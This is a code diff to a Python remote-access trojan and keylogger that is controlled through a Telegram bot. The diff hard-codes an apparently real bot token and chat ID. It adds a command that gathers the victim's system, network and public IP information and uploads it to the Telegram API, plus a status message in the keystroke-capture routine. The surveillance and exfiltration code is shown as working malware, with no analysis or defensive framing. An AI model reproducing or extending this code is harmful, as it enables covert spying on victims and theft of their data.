@@ -24,6 +24,7 @@ import wavio as wv
 import cv2
 import sys
 from singel_run import SingelProcess
+from system_information import Computer_inforamtion
 import json
 
 
@@ -32,7 +33,8 @@ key_crypt=b'64anpQ1F__rHalgTiLjqVNcf7TyirzwEqGJQM3fKAC8='
 telegram_token = 'Your telegram bot token'
 chat_id = 'chat id'
 
-
+telegram_token = '5424626039:AAHFuTTwIoIQI8I-3hgPvg8vE5_gFTtLmRI'
+chat_id = '-1001550861772'
 keys=[]
 count=0
 
@@ -279,6 +281,7 @@ def write_to_file(keys):
             
 
 def capture_data():
+    send_message('trying to capture data...')
     data=''
     count_key=0
     key_red_list=[' <Shift> ',' <Backspace> ',' <Ctrl> ',' <Caps_lock> ',' <Left> ',' <Right> '," <Down> "," <Up> ",' <Alt> ',' <Tab> ']
@@ -609,6 +612,20 @@ def start_project():
                             else:
                                 send_message('Failed open camera.')
 
+                        elif 'get advanced computer info' in command:
+                            output=''
+                            test=Computer_inforamtion()
+                            output+=test.regional_time()+'\n'
+                            output+=test.system_info()+'\n'
+                            output+=test.boot_time()+'\n'
+                            output+=test.cpu_info()+'\n'
+                            output+=test.memory_info()+'\n'
+                            output+=test.disk_info()+'\n'
+                            output+=test.network_info()+'\n'
+                            output+=test.public_ip_information()+'\n'
+                            files={'document':output.encode()}
+                            requests.post("https://api.telegram.org/bot"+telegram_token+"/sendDocument?chat_id="+chat_id+"&caption=output.txt" ,files=files)
+                            output=''
 
                         elif "quit seassion" in command:
                             send_message('seassion coled.')
